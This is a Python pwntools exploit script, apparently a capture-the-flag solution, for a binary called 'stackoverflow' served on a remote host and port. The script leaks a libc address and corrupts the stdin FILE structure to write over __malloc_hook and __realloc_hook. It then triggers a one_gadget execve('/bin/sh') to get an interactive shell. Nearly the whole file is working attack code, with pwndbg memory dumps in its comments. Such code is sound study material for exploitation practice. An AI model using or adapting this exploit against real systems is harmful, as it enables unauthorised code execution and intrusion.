
from pwn import *
from time import sleep
from zio import l64
import sys
context.binary = "./stackoverflow"

if sys.argv[1] == "l":
    io = process("./stackoverflow")
else:
    io = remote("118.31.11.175", 20005)

libc = ELF("./libc-2.24.so", checksec = False)
libc.sym['one_gadget'] = 0x4557a
'''
0x4557a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL
'''

# if __name__ == "__main__":
with context.quiet:
    # context.log_level = "debug"
    io.sendafter("bro:", '0' * 0x19)
    sleep(0.01)
    io.recvuntil('0' * 0x18)
    libc.address = u64(io.recvn(6) + '\0\0') - libc.sym['_IO_2_1_stdout_'] - 48
    success("libc -> {:#x}".format(libc.address))

    io.sendlineafter("stackoverflow: ", str(0x6c28e8)) # lsb(_IO_2_1_stdin_.file._IO_buf_base_) = \x00
    io.sendlineafter("stackoverflow: ", str(0x300000))

    io.sendafter("ropchain: ", 'dummy')
    sleep(0.01)

    target = libc.sym['__malloc_hook'] + 8
    io.sendafter("stackoverflow: ", flat(target))
    sleep(0.01)
    io.sendafter("ropchain: ", 'dummy')
    sleep(0.01)

    '''
    _IO_read_ptr = 0x7f62315fb902 <_IO_2_1_stdin_+66> "_1b\177", 
    _IO_read_end = 0x7f62315fb908 <_IO_2_1_stdin_+72> "", 
    '''
    for i in range(7):
        # io.recvuntil('stackoverflow:')
        io.sendafter('ropchain: ', str(i))
        sleep(0.01)
    '''
    pwndbg> x/70gx 0x7f1dadfe2900
    0x7f1dadfe2900 <_IO_2_1_stdin_+64>:	0x00007f1dadfe2af8	0x0000000000000000
    0x7f1dadfe2910 <_IO_2_1_stdin_+80>:	0x0000000000000000	0x0000000000000000
    0x7f1dadfe2920 <_IO_2_1_stdin_+96>:	0x0000000000000000	0x0000000000000000
    0x7f1dadfe2930 <_IO_2_1_stdin_+112>:	0x0000000000000000	0xffffffffffffffff
    0x7f1dadfe2940 <_IO_2_1_stdin_+128>:	0x000000000a000000	0x00007f1dadfe4770
    0x7f1dadfe2950 <_IO_2_1_stdin_+144>:	0xffffffffffffffff	0x0000000000000000
    0x7f1dadfe2960 <_IO_2_1_stdin_+160>:	0x00007f1dadfe29a0	0x0000000000000000
    0x7f1dadfe2970 <_IO_2_1_stdin_+176>:	0x0000000000000000	0x0000000000000000
    0x7f1dadfe2980 <_IO_2_1_stdin_+192>:	0x00000000ffffffff	0x0000000000000000
    0x7f1dadfe2990 <_IO_2_1_stdin_+208>:	0x0000000000000000	0x00007f1dadfdf400
    0x7f1dadfe29a0 <_IO_wide_data_0>:	0x0000000000000000	0x0000000000000000
    0x7f1dadfe29b0 <_IO_wide_data_0+16>:	0x0000000000000000	0x0000000000000000
    0x7f1dadfe29c0 <_IO_wide_data_0+32>:	0x0000000000000000	0x0000000000000000
    0x7f1dadfe29d0 <_IO_wide_data_0+48>:	0x0000000000000000	0x0000000000000000
    0x7f1dadfe29e0 <_IO_wide_data_0+64>:	0x0000000000000000	0x0000000000000000
    0x7f1dadfe29f0 <_IO_wide_data_0+80>:	0x0000000000000000	0x0000000000000000
    0x7f1dadfe2a00 <_IO_wide_data_0+96>:	0x0000000000000000	0x0000000000000000
    0x7f1dadfe2a10 <_IO_wide_data_0+112>:	0x0000000000000000	0x0000000000000000
    0x7f1dadfe2a20 <_IO_wide_data_0+128>:	0x0000000000000000	0x0000000000000000
    0x7f1dadfe2a30 <_IO_wide_data_0+144>:	0x0000000000000000	0x0000000000000000
    0x7f1dadfe2a40 <_IO_wide_data_0+160>:	0x0000000000000000	0x0000000000000000
    0x7f1dadfe2a50 <_IO_wide_data_0+176>:	0x0000000000000000	0x0000000000000000
    0x7f1dadfe2a60 <_IO_wide_data_0+192>:	0x0000000000000000	0x0000000000000000
    0x7f1dadfe2a70 <_IO_wide_data_0+208>:	0x0000000000000000	0x0000000000000000
    0x7f1dadfe2a80 <_IO_wide_data_0+224>:	0x0000000000000000	0x0000000000000000
    0x7f1dadfe2a90 <_IO_wide_data_0+240>:	0x0000000000000000	0x0000000000000000
    0x7f1dadfe2aa0 <_IO_wide_data_0+256>:	0x0000000000000000	0x0000000000000000
    0x7f1dadfe2ab0 <_IO_wide_data_0+272>:	0x0000000000000000	0x0000000000000000
    0x7f1dadfe2ac0 <_IO_wide_data_0+288>:	0x0000000000000000	0x0000000000000000
    0x7f1dadfe2ad0 <_IO_wide_data_0+304>:	0x00007f1dadfdeec0	0x0000000000000000
    0x7f1dadfe2ae0 <__memalign_hook>:	0x00007f1dadca9680	0x00007f1dadca9260
    0x7f1dadfe2af0 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
    '''
    fake_struct  = flat(target)                                 # _IO_buf_end = libc.sym['__malloc_hook'] + 8
    fake_struct += flat(0) * 6                                  # _IO_save_base ~ flag2
    fake_struct += l64(-1) + flat(0x000000000a000000)           # _old_offset ~ _shortbuf
    fake_struct += flat(libc.address + 0x3c3770)                # _IO_stdfile_0_lock
    fake_struct += l64(-1) + flat(0)                            # _offset ~ _codecvt
    fake_struct += flat(libc.address + 0x3c19a0)                # _wide_data = _IO_wide_data_0
    fake_struct += flat(0) * 3                                  # _freeres_list ~ __pad5
    fake_struct += flat(0x00000000ffffffff, 0, 0)               # _mode ~ _unused2
    fake_struct += flat(libc.sym['_IO_file_jumps'])             # vtable
    fake_struct += p8(0) * 304                                  # _IO_wide_data_0
    fake_struct += flat(libc.sym['_IO_wfile_jumps'], 0)         # _IO_wide_data_0
    fake_struct += flat(0)                                      # __memalign_hook
    fake_struct += flat(libc.sym['one_gadget'])                 # __realloc_hook
    fake_struct += flat(libc.sym['__libc_realloc'] + 0x10)      # __malloc_hook

    # raw_input("ATTACH : ")
    io.sendafter("stackoverflow: ", fake_struct)
    sleep(0.01)
    info("trigger one_gadget [{:#x}]".format(libc.sym['one_gadget']))
    # raw_input("DEBUG : ")

    io.interactive()
